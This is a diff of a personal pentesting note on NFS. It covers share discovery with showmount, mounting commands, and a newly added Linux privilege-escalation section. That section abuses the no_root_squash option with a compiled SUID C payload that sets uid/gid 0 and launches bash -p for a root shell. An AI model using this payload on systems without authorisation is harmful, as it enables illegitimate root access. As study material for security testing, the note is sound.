@@ -2,7 +2,7 @@
 tags:
   - "#type/tech-specific" 
 ---
-# NFS
+# Fundamentals
 
 NFS - network file system
 
@@ -18,21 +18,23 @@ a file system or part of a file system can be mounted remotely on a server and t
 - configuration info in /etc/exports
 - critical option for privesc: no_root_sqash
 
-## Tools
+# Pentesting
 
-for enumeration: nfs-common:
+## Discovery
 
-### Showmount
+**Tools:**
 
-show mounted nfs shares on ip adress
+- nfs-common
+- showmount
+	- show mounted nfs shares on ip adress
+	- eg. `showmount -e [IP]`
 
-eg. `showmount -e [IP]`
+## Connect to / Mount nfs share
 
-### mount.nfs
+**Tools:**
 
-`mount.nfs`: mounting nfs shares
-
-### Mounting NFS Shares
+- mount.nfs
+- mount - see below
 
 `sudo mount -t [type] IP:[ip adress and share name] -nolock`
 
@@ -42,3 +44,36 @@ eg: `sudo mount -t nfs IP:share /tmp/mount/ -nolock`
 |----------|--------------|
 | `-t` | type of device to mount, eg. nfs |
 | `-nolock` | do not use nlm locking |
+
+## Privilege Escalation - Linux
+
+**Prerequisites:** options `rw` and `no_root_sqash` must be set
+
+**Workflow:**
+
+1. connect to nfs / mount nfs share
+2. generate file that launches bash (see section payloads)
+3. set ownership of file to "root" and set suid
+4. execute on target system -> root shell is started
+
+**Payload**
+
+c code to execute shell with suid and guid set
+
+compile with: `gcc [filename] -o [filename] -w`
+
+set suid with `chmod +s [filename]`
+
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main(void)
+{
+	setgid(0);
+	setuid(0);
+	system("/bin/bash -p");
+	return 0;
+}
+``` 
